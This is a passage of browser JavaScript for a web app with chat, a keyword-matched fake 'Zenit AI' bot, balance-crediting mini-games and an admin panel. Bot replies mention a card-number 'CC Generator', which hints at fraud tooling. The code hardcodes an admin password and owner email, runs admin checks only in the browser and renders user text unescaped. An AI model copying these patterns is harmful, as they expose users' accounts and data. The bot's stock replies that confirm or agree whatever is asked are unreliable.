        chatMessages.scrollTop = chatMessages.scrollHeight;
    }

    function sendChatMessage() {
        const text = chatInput.value.trim();
        if (!text) return;
        chatMessagesData.push({ sender: displayName, text, time: Date.now() });
        saveChatMessages();
        renderChatMessages();
        chatInput.value = '';
    }

    if (sendChatBtn) sendChatBtn.addEventListener('click', sendChatMessage);
    if (chatInput) chatInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') sendChatMessage(); });

    // ---- ZENIT AI ----
    const aiMessages = $('aiMessages');
    const aiInput = $('aiInput');
    const sendAiBtn = $('sendAiBtn');
    let aiMessagesData = JSON.parse(localStorage.getItem('aiMessages_' + userId)) || [];

    function saveAIMessages() { localStorage.setItem('aiMessages_' + userId, JSON.stringify(aiMessagesData)); }

    function renderAIMessages() {
        if (!aiMessages) return;
        aiMessages.innerHTML = '';
        if (!aiMessagesData.length) {
            aiMessages.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:20px;">Hello! I\'m Zenit, how can I help?</div>';
            return;
        }
        aiMessagesData.forEach(msg => {
            const div = document.createElement('div');
            div.className = 'ai-msg';
            div.innerHTML = `<span class="sender">${msg.sender}</span><span class="text">${msg.text}</span><span class="time">${new Date(msg.time).toLocaleTimeString()}</span>`;
            aiMessages.appendChild(div);
        });
        aiMessages.scrollTop = aiMessages.scrollHeight;
    }

    const aiResponses = [
        "Hello! I'm Zenit, the founder. How can I assist you? 😊",
        "Great! It's nice to talk to you. How can I help?",
        "Of course! I can help with CC Generator, Balance, Chat, or other topics.",
        "You're welcome! I'm always here. 🙏",
        "You can generate cards with CC Generator and validate with Validator.",
        "You can deposit or transfer balance from the Balance section.",
        "Security is important. You can change your password in Settings.",
        "I'm Zenit, the founder of this platform. I'm here as an AI assistant. 🤖",
        "I understand. I can give you more details on this.",
        "Yes, you're right. You're correct on this.",
        "Actually, there's a different perspective on this.",
        "How can I help you? Please specify your question.",
        "I know the answer to this! I can explain if you want.",
        "Great question! Let's think about it.",
        "I absolutely agree. This is an important point.",
        "I'd be happy to help you with this.",
        "Interesting thought! I hadn't thought of that before.",
        "Yes, it's possible. I can explain the details.",
        "My suggestion is to do a bit more research on this.",
        "Great! I really like this idea.",
        "To do this, you should follow these steps.",
        "Actually, this process is very simple. Let me show you.",
        "I have experience in this. I can help you.",
        "Yes, that's definitely correct. I can confirm.",
        "There are multiple answers to this question. Which one do you want?",
        "I can give you more detailed information on this.",
        "This is a great question! I know the answer.",
        "Unfortunately, I don't have enough information on this.",
        "I'd like to help you with this.",
        "Great! I love this question.",
        "Yes, this is a very important topic.",
        "I have a few suggestions for you on this.",
        "To do this, follow these steps.",
        "This is very interesting! I haven't heard this before.",
        "You're absolutely right. This is very correct.",
        "I can help you with this.",
        "Great idea! You should implement this.",
        "I trust you on this. You can do it.",
        "Yes, that's correct. I confirm.",
        "I can support you on this.",
        "Great! This is a very nice approach.",
        "I can give you detailed information on this.",
        "The answer to this question is very simple. Here it is.",
        "I'd be happy to help you with this.",
        "Great question! I'll answer right away.",
        "My suggestion for you is as follows.",
        "Yes, it's possible. We can do it right away.",
        "This is a great thought! Keep going.",
        "I can help you with this.",
        "I have experience in this. Let me help you.",
        "Great! I love this question.",
        "Yes, that's correct. I completely agree.",
        "I can help you with this.",
        "This is a very interesting topic. We can talk more.",
        "I can give you a few tips on this.",
        "I'd like to help you with this.",
        "Great! This is a very good idea.",
        "Yes, it's possible. Let's do it now.",
        "I can help you with this.",
        "This is a great question! I know the answer.",
        "I can give you detailed information on this.",
        "I'd be happy to help you with this.",
        "Great! I love this question.",
        "Yes, that's correct. I confirm.",
        "I can help you with this.",
        "This is a very interesting topic. We can talk more.",
        "I have a few suggestions for you on this.",
        "I'd like to help you with this.",
        "Great! This is a very nice approach.",
        "Yes, it's possible. We can do it right away.",
        "I can help you with this.",
        "This is a great thought! Keep going."
    ];

    function getAIResponse(text) {
        const lower = text.toLowerCase();
        if (lower.includes('hello') || lower.includes('hi') || lower.includes('hey')) {
            return aiResponses[Math.floor(Math.random() * 5)];
        }
        if (lower.includes('how are you') || lower.includes('how')) {
            return aiResponses[Math.floor(Math.random() * 3) + 5];
        }
        if (lower.includes('help') || lower.includes('support')) {
            return aiResponses[Math.floor(Math.random() * 4) + 8];
        }
        if (lower.includes('thanks') || lower.includes('thank')) {
            return aiResponses[Math.floor(Math.random() * 3) + 12];
        }
        if (lower.includes('cc') || lower.includes('card')) {
            return aiResponses[Math.floor(Math.random() * 4) + 15];
        }
        if (lower.includes('balance') || lower.includes('money')) {
            return aiResponses[Math.floor(Math.random() * 4) + 19];
        }
        if (lower.includes('password') || lower.includes('security')) {
            return aiResponses[Math.floor(Math.random() * 3) + 23];
        }
        if (lower.includes('who are you') || lower.includes('what are you')) {
            return aiResponses[Math.floor(Math.random() * 3) + 26];
        }
        if (lower.includes('game') || lower.includes('wheel')) {
            return aiResponses[Math.floor(Math.random() * 4) + 29];
        }
        return aiResponses[Math.floor(Math.random() * aiResponses.length)];
    }

    function sendAIMessage() {
        const text = aiInput.value.trim();
        if (!text) return;
        aiMessagesData.push({ sender: displayName, text, time: Date.now() });
        const response = getAIResponse(text);
        setTimeout(() => {
            aiMessagesData.push({ sender: 'Zenit 🤖', text: response, time: Date.now() });
            saveAIMessages();
            renderAIMessages();
        }, 300 + Math.random() * 700);
        saveAIMessages();
        renderAIMessages();
        aiInput.value = '';
    }

    if (sendAiBtn) sendAiBtn.addEventListener('click', sendAIMessage);
    if (aiInput) aiInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') sendAIMessage(); });

    // ---- SPIN WHEEL ----
    const spinBtn = $('spinBtn');
    const spinResult = $('wheelResult');
    const spinUsed = $('spinUsed');
    const wheelCanvas = $('wheelCanvas');
    let wheelSegments = [
        { label: '5 TL', value: 5, color: '#ff6b6b' },
        { label: '15 TL', value: 15, color: '#ffd93d' },
        { label: '25 TL', value: 25, color: '#6bcb77' },
        { label: '40 TL', value: 40, color: '#4d96ff' },
        { label: '50 TL', value: 50, color: '#9b59b6' },
        { label: '60 TL', value: 60, color: '#ff9f43' },
        { label: '100 TL', value: 100, color: '#ff4757' }
    ];
    let wheelAngle = 0;
    let isSpinning = false;

    function drawWheel() {
        if (!wheelCanvas) return;
        const ctx = wheelCanvas.getContext('2d');
        const w = wheelCanvas.width;
        const h = wheelCanvas.height;
        const cx = w / 2, cy = h / 2;
        const r = Math.min(w, h) / 2 - 10;
        ctx.clearRect(0, 0, w, h);
        const seg = 2 * Math.PI / wheelSegments.length;
        const startAngle = wheelAngle;
        wheelSegments.forEach((s, i) => {
            const a = startAngle + i * seg;
            ctx.beginPath();
            ctx.moveTo(cx, cy);
            ctx.arc(cx, cy, r, a, a + seg);
            ctx.closePath();
            ctx.fillStyle = s.color;
            ctx.fill();
            ctx.strokeStyle = '#fff';
            ctx.lineWidth = 2;
            ctx.stroke();
            ctx.save();
            ctx.translate(cx, cy);
            ctx.rotate(a + seg / 2);
            ctx.fillStyle = '#fff';
            ctx.font = 'bold 12px Inter';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillText(s.label, r * 0.65, 0);
            ctx.restore();
        });
        ctx.beginPath();
        ctx.moveTo(cx, 10);
        ctx.lineTo(cx - 12, 25);
        ctx.lineTo(cx + 12, 25);
        ctx.closePath();
        ctx.fillStyle = '#ff3b30';
        ctx.fill();
    }

    function spinWheel() {
        if (isSpinning) return;
        const spinData = getGameLimit('spin', 1);
        if (spinData.count >= 1) {
            showToast('Daily limit reached! Try again tomorrow.', 'error');
            return;
        }
        isSpinning = true;
        const spins = 5 + Math.random() * 5;
        const targetAngle = spins * 2 * Math.PI + Math.random() * 2 * Math.PI;
        const duration = 4000 + Math.random() * 2000;
        const startAngle = wheelAngle;
        const startTime = Date.now();

        function animate() {
            const elapsed = Date.now() - startTime;
            const progress = Math.min(elapsed / duration, 1);
            const ease = 1 - Math.pow(1 - progress, 3);
            wheelAngle = startAngle + targetAngle * ease;
            drawWheel();
            if (progress < 1) { requestAnimationFrame(animate); } else {
                wheelAngle += targetAngle;
                isSpinning = false;
                const normalized = wheelAngle % (2 * Math.PI);
                const segSize = 2 * Math.PI / wheelSegments.length;
                let idx = Math.floor(((2 * Math.PI - normalized) / segSize) % wheelSegments.length);
                if (idx < 0) idx += wheelSegments.length;
                const prize = wheelSegments[idx].value;
                const data = getGameLimit('spin', 1);
                data.count++;
                localStorage.setItem('game_spin_' + userId, JSON.stringify(data));
                currentUser.balance += prize;
                saveUsers();
                updateUI();
                spinResult.textContent = `🎉 You won ${prize} TL! 🎉`;
                showToast(`You won ${prize} TL!`, 'success');
                if (spinUsed) {
                    const sd = getGameLimit('spin', 1);
                    spinUsed.textContent = sd.count >= 1 ? 0 : 1;
                }
            }
        }
        animate();
    }

    if (spinBtn) spinBtn.addEventListener('click', spinWheel);

    // ---- GUESS NUMBER ----
    const guessInput = $('guessInput');
    const guessBtn = $('guessBtn');
    const guessResult = $('guessResult');
    const guessLeft = $('guessLeft');
    let guessNumber = Math.floor(Math.random() * 100) + 1;
    let guessAttempts = 0;

    if (guessBtn) {
        guessBtn.addEventListener('click', function() {
            const guess = parseInt(guessInput.value);
            if (isNaN(guess) || guess < 1 || guess > 100) {
                showToast('Enter a number between 1-100.', 'error');
                return;
            }
            if (!useGameLimit('guess', 4)) {
                showToast('Daily limit reached!', 'error');
                return;
            }
            guessAttempts++;
            if (guess === guessNumber) {
                currentUser.balance += 10;
                saveUsers();
                updateUI();
                guessResult.textContent = `🎉 Correct! You guessed in ${guessAttempts} attempts! You won 10 TL.`;
                guessNumber = Math.floor(Math.random() * 100) + 1;
                guessAttempts = 0;
                showToast('You won 10 TL!', 'success');
            } else if (guess < guessNumber) {
                guessResult.textContent = `⬆️ Higher! (Attempt ${guessAttempts})`;
            } else {
                guessResult.textContent = `⬇️ Lower! (Attempt ${guessAttempts})`;
            }
            guessInput.value = '';
            if (guessLeft) guessLeft.textContent = getGameRemain('guess', 4);
        });
        guessInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') guessBtn.click(); });
    }

    // ---- COIN FLIP ----
    const coinHeads = $('coinHeads');
    const coinTails = $('coinTails');
    const coinResult = $('coinResult');
    const coinStatus = $('coinStatus');
    const coinRemain = $('coinRemain');

    if (coinHeads && coinTails) {
        coinHeads.addEventListener('click', function() { playCoinFlip('heads'); });
        coinTails.addEventListener('click', function() { playCoinFlip('tails'); });
    }

    function playCoinFlip(choice) {
        if (!useGameLimit('coinflip', 4)) {
            showToast('Daily limit reached!', 'error');
            return;
        }
        const result = Math.random() < 0.5 ? 'heads' : 'tails';
        const emoji = result === 'heads' ? '👑 Heads' : '🪙 Tails';
        coinResult.textContent = result === 'heads' ? '👑' : '🪙';
        coinResult.className = 'spin';
        setTimeout(() => { coinResult.className = ''; }, 600);

        if (choice === result) {
            currentUser.balance += 5;
            saveUsers();
            updateUI();
            coinStatus.textContent = `✅ ${emoji}! You won 5 TL!`;
            showToast('You won 5 TL!', 'success');
        } else {
            coinStatus.textContent = `❌ ${emoji}. You lost.`;
        }
        if (coinRemain) coinRemain.textContent = getGameRemain('coinflip', 4);
    }

    // ---- DICE ----
    const diceBtn = $('diceBtn');
    const diceResult = $('diceResult');
    const diceStatus = $('diceStatus');
    const diceRemain = $('diceRemain');

    if (diceBtn) {
        diceBtn.addEventListener('click', function() {
            if (!useGameLimit('dice', 4)) {
                showToast('Daily limit reached!', 'error');
                return;
            }
            const value = Math.floor(Math.random() * 6) + 1;
            const emojis = ['⚀', '⚁', '⚂', '⚃', '⚄', '⚅'];
            diceResult.textContent = emojis[value - 1];
            diceResult.className = 'roll';
            setTimeout(() => { diceResult.className = ''; }, 500);
            if (value === 6) {
                currentUser.balance += 5;
                saveUsers();
                updateUI();
                diceStatus.textContent = `🎉 You rolled 6! You won 5 TL!`;
                showToast('You won 5 TL!', 'success');
            } else {
                diceStatus.textContent = `You rolled ${value}. You lost.`;
            }
            if (diceRemain) diceRemain.textContent = getGameRemain('dice', 4);
        });
    }

    // ---- RPS ----
    const rpsRock = $('rpsRock');
    const rpsPaper = $('rpsPaper');
    const rpsScissors = $('rpsScissors');
    const rpsResult = $('rpsResult');
    const rpsStatus = $('rpsStatus');
    const rpsRemain = $('rpsRemain');

    if (rpsRock && rpsPaper && rpsScissors) {
        rpsRock.addEventListener('click', function() { playRPS('rock'); });
        rpsPaper.addEventListener('click', function() { playRPS('paper'); });
        rpsScissors.addEventListener('click', function() { playRPS('scissors'); });
    }

    function playRPS(player) {
        if (!useGameLimit('rps', 4)) {
            showToast('Daily limit reached!', 'error');
            return;
        }
        const choices = ['rock', 'paper', 'scissors'];
        const emojis = { rock: '🪨', paper: '📄', scissors: '✂️' };
        const winMap = { rock: 'scissors', paper: 'rock', scissors: 'paper' };
        const computer = choices[Math.floor(Math.random() * choices.length)];

        rpsResult.textContent = `${emojis[player]} vs ${emojis[computer]}`;

        if (player === computer) {
            rpsStatus.textContent = '🤝 Draw!';
        } else if (winMap[player] === computer) {
            currentUser.balance += 5;
            saveUsers();
            updateUI();
            rpsStatus.textContent = `✅ You won! 5 TL earned!`;
            showToast('You won 5 TL!', 'success');
        } else {
            rpsStatus.textContent = `❌ You lost.`;
        }
        if (rpsRemain) rpsRemain.textContent = getGameRemain('rps', 4);
    }

    // ---- SETTINGS ----
    const displayNameInput = $('displayName');
    const profileId = $('profileId');
    const profileAvatar = $('profileAvatar');
    const avatarUpload = $('avatarUpload');
    const userBioInput = $('userBio');
    const changePasswordInput = $('changePasswordInput');
    const themeSelect = $('themeSelect');
    const saveProfileBtn = $('saveProfileBtn');

    if (avatarUpload) {
        avatarUpload.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = function(event) {
                userAvatar = event.target.result;
                currentUser.avatar = userAvatar;
                saveUsers();
                updateUI();
                showToast('Profile picture updated.', 'success');
            };
            reader.readAsDataURL(file);
        });
    }

    if (saveProfileBtn) {
        saveProfileBtn.addEventListener('click', function() {
            const newName = displayNameInput.value.trim();
            const newPassword = changePasswordInput.value.trim();
            const newBio = userBioInput.value.trim();
            const newTheme = themeSelect.value;
            if (!newName) { showToast('Username cannot be empty.', 'error'); return; }
            displayName = newName;
            currentUser.displayName = displayName;
            userBio = newBio;
            currentUser.bio = userBio;
            if (newPassword) {
                if (newPassword.length < 4) { showToast('Password must be at least 4 characters.', 'error'); return; }
                currentUser.password = newPassword;
                changePasswordInput.value = '';
                showToast('Password changed.', 'success');
            }
            document.documentElement.setAttribute('data-theme', newTheme);
            localStorage.setItem('theme', newTheme);
            const sessionData = JSON.parse(localStorage.getItem('ccSession'));
            sessionData.displayName = displayName;
            if (userAvatar) sessionData.avatar = userAvatar;
            if (userBio) sessionData.bio = userBio;
            localStorage.setItem('ccSession', JSON.stringify(sessionData));
            saveUsers();
            updateUI();
            showToast('Profile updated.', 'success');
        });
    }

    // ---- ADMIN ----
    const adminLock = $('adminLock');
    const adminContent = $('adminContent');
    const adminPassInput = $('adminPassInput');
    const adminUnlockBtn = $('adminUnlockBtn');
    const adminLockError = $('adminLockError');
    const newAdminPass = $('newAdminPass');
    const changeAdminPassBtn = $('changeAdminPassBtn');
    const userList = $('userList');
    const banList = $('banList');
    const newKeyDisplay = $('newKeyDisplay');
    const generateKeyBtn = $('generateKeyBtn');
    let adminAttempts = 0;
    let adminLockedUntil = 0;
    const rootPassword = 'root2025';

    if (adminUnlockBtn) {
        adminUnlockBtn.addEventListener('click', function() {
            const pass = adminPassInput.value.trim();
            if (Date.now() < adminLockedUntil) {
                const remain = Math.ceil((adminLockedUntil - Date.now()) / 1000);
                showToast(`Too many failed attempts. Wait ${remain} seconds.`, 'error');
                return;
            }
            if (pass === rootPassword || pass === adminPassword) {
                adminLock.style.display = 'none';
                adminContent.style.display = 'block';
                adminLockError.style.display = 'none';
                adminAttempts = 0;
                renderAdminPanel();
                renderBanList();
                showToast('Welcome to Admin Panel.', 'success');
            } else {
                adminAttempts++;
                adminLockError.style.display = 'block';
                adminLockError.textContent = `Wrong password! (${adminAttempts}/3)`;
                if (adminAttempts >= 3) {
                    adminLockedUntil = Date.now() + 30000;
                    adminLockError.textContent = 'Too many attempts! Wait 30 seconds.';
                    adminPassInput.disabled = true;
                    setTimeout(() => {
                        adminPassInput.disabled = false;
                        adminLockedUntil = 0;
                        adminLockError.textContent = 'Wrong password!';
                    }, 30000);
                }
            }
        });
        adminPassInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') adminUnlockBtn.click(); });
    }

    if (changeAdminPassBtn) {
        changeAdminPassBtn.addEventListener('click', function() {
            const newPass = newAdminPass.value.trim();
            if (!newPass || newPass.length < 4) { showToast('Password must be at least 4 characters.', 'error'); return; }
            adminPassword = newPass;
            localStorage.setItem('adminPassword', adminPassword);
            newAdminPass.value = '';
            showToast('Admin password changed.', 'success');
        });
    }

    window.banUser = function(email, duration = null) {
        let bans = JSON.parse(localStorage.getItem('bannedUsers')) || [];
        if (!bans.some(b => b.email === email)) {
            bans.push({ email, duration: duration || 'permanent', timestamp: Date.now() });
            localStorage.setItem('bannedUsers', JSON.stringify(bans));
        }
    };

    window.unbanUser = function(email) {
        let bans = JSON.parse(localStorage.getItem('bannedUsers')) || [];
        bans = bans.filter(b => b.email !== email);
        localStorage.setItem('bannedUsers', JSON.stringify(bans));
    };

    function renderBanList() {
        if (!banList) return;
        const banned = JSON.parse(localStorage.getItem('bannedUsers')) || [];
        banList.innerHTML = '';
        if (!banned.length) {
            banList.innerHTML = '<li style="color:var(--text-muted);">No banned users.</li>';
            return;
        }
        banned.forEach(ban => {
            const li = document.createElement('li');
            li.innerHTML = `
                <span>${ban.email}</span>
                <div class="actions">
                    <button class="unban-btn" data-email="${ban.email}">Unban</button>
                </div>
            `;
            banList.appendChild(li);
        });
        banList.querySelectorAll('.unban-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                const email = this.dataset.email;
                if (!confirm(`Unban ${email}?`)) return;
                window.unbanUser(email);
                renderBanList();
                renderAdminPanel();
                showToast(`${email} unbanned.`, 'success');
            });
        });
    }

    function renderAdminPanel() {
        if (session.email !== 'apomuhammed1@gmail.com' || !userList) return;
        const ul = userList;
        ul.innerHTML = '';
        users.forEach(u => {
            const li = document.createElement('li');
            li.innerHTML = `
                <span>${u.email} (${u.displayName}) ${u.isAdmin ? '👑' : ''}</span>
                <span style="font-size:12px;color:var(--text-muted);">ID: ${u.userId} | Balance: ${u.balance.toFixed(2)} TL</span>
                <div class="actions">
                    <button class="premium-btn ${u.premium ? 'active' : ''}" data-email="${u.email}" data-action="premium">${u.premium ? '⭐ Premium' : 'Make Premium'}</button>
                    <button class="admin-btn" data-email="${u.email}" data-action="admin">${u.isAdmin ? 'Remove Admin' : 'Make Admin'}</button>
                    <button class="ban-btn" data-email="${u.email}" data-action="ban">Ban</button>
                    <button class="delete-btn" data-email="${u.email}" data-action="delete">Delete</button>
                </div>
            `;
            ul.appendChild(li);
        });
        ul.querySelectorAll('[data-action="premium"]').forEach(btn => {
            btn.addEventListener('click', function() {
                const user = users.find(u => u.email === this.dataset.email);
                if (!user) return;
                user.premium = !user.premium;
                saveUsers();
                renderAdminPanel();
                updateUI();
                showToast(`${user.email} premium ${user.premium ? 'enabled' : 'disabled'}.`, 'info');
            });
        });
        ul.querySelectorAll('[data-action="admin"]').forEach(btn => {
            btn.addEventListener('click', function() {
                const email = this.dataset.email;
                if (email === currentUser.email) { showToast('Cannot change your own admin status.', 'error'); return; }
                const user = users.find(u => u.email === email);
                if (!user) return;
                user.isAdmin = !user.isAdmin;
                saveUsers();
                renderAdminPanel();
                updateUI();
                showToast(`${user.email} admin ${user.isAdmin ? 'enabled' : 'disabled'}.`, 'info');
            });
        });
        ul.querySelectorAll('[data-action="ban"]').forEach(btn => {
            btn.addEventListener('click', function() {
                const email = this.dataset.email;
                if (email === currentUser.email) { showToast('Cannot ban yourself.', 'error'); return; }
                const dur = prompt('Duration (minutes) or "permanent":', 'permanent');
                if (dur === null) return;
                const duration = dur.toLowerCase().trim();
                const banDuration = (duration === 'permanent' || isNaN(parseInt(duration))) ? 'permanent' : parseInt(duration);
                window.banUser(email, banDuration);
                renderAdminPanel();
                renderBanList();
                showToast(`${email} banned.`, 'success');
            });
        });
        ul.querySelectorAll('[data-action="delete"]').forEach(btn => {
            btn.addEventListener('click', function() {
                const email = this.dataset.email;
                if (email === currentUser.email) { showToast('Cannot delete yourself.', 'error'); return; }
                if (!confirm(`Delete ${email}?`)) return;
                users = users.filter(u => u.email !== email);
                saveUsers();
                renderAdminPanel();
                updateUI();
                showToast(`${email} deleted.`, 'success');
            });
        });
    }

    if (generateKeyBtn) {
        generateKeyBtn.addEventListener('click', function() {
            if (session.email !== 'apomuhammed1@gmail.com') { showToast('Access denied.', 'error'); return; }
            const key = Math.random().toString(36).substring(2, 10).toUpperCase();
            registrationKeys.push(key);
            localStorage.setItem('registrationKeys', JSON.stringify(registrationKeys));
            newKeyDisplay.value = key;
            showToast('New key: ' + key, 'success');
        });
    }

    // ---- SIDEBAR ----
    const menuToggle = $('menuToggle');
    const sidebar = $('sidebar');
    const sidebarOverlay = $('sidebarOverlay');
    const sidebarClose = $('sidebarClose');
    const logoutBtn = $('logoutBtn');
    const themeToggle = $('themeToggle');

    function openSidebar() { sidebar.classList.add('open'); sidebarOverlay.classList.add('active'); document.body.style.overflow = 'hidden'; }
    function closeSidebar() { sidebar.classList.remove('open'); sidebarOverlay.classList.remove('active'); document.body.style.overflow = ''; }

    if (menuToggle) menuToggle.addEventListener('click', openSidebar);
    if (sidebarClose) sidebarClose.addEventListener('click', closeSidebar);
    if (sidebarOverlay) sidebarOverlay.addEventListener('click', closeSidebar);

    // ---- THEME ----
    if (themeToggle) {
        themeToggle.addEventListener('click', function() {
            const html = document.documentElement;
            const isDark = html.getAttribute('data-theme') === 'dark';
            const newTheme = isDark ? 'light' : 'dark';
            html.setAttribute('data-theme', newTheme);
            this.querySelector('i').className = isDark ? 'fas fa-sun' : 'fas fa-moon';
            if (themeSelect) themeSelect.value = newTheme;
            showToast(isDark ? 'Light theme' : 'Dark theme', 'info');
        });
    }

    // ---- LOGOUT ----
    if (logoutBtn) {
        logoutBtn.addEventListener('click', function() {
            let sessions = JSON.parse(localStorage.getItem('ccSessions')) || [];
            sessions = sessions.filter(s => s.email !== currentUser.email);
            localStorage.setItem('ccSessions', JSON.stringify(sessions));
            localStorage.removeItem('ccSession');
            showToast('Logged out.', 'info');
            setTimeout(() => { window.location.href = 'index.html'; }, 500);
        });
    }

    // ---- NAV ----
    navItems.forEach(item => {
        if (!item) return;
        item.addEventListener('click', function() {
            const tab = this.dataset.tab;
            if (!tab) return;
            if (tab === 'admin' && session.email !== 'apomuhammed1@gmail.com') { showToast('Admin access required.', 'error'); return; }
            switchTab(tab);
        });
    });

    // ---- INIT ----
    const savedTheme = localStorage.getItem('theme') || 'light';
    document.documentElement.setAttribute('data-theme', savedTheme);
    if (themeSelect) themeSelect.value = savedTheme;
    if (themeToggle) {
        themeToggle.querySelector('i').className = savedTheme === 'dark' ? 'fas fa-moon' : 'fas fa-sun';
    }

    updateSession();
    updateUI();

    if (session.email === 'apomuhammed1@gmail.com') {
        if (adminLock) adminLock.style.display = 'block';
        if (adminContent) adminContent.style.display = 'none';
    }

    initMusic();

    updateOnline();
    setInterval(updateOnline, 15000);

    setTimeout(drawWheel, 100);

    window.addEventListener('resize', function() {
        if (window.innerWidth >= 769) closeSidebar();
    });

})();
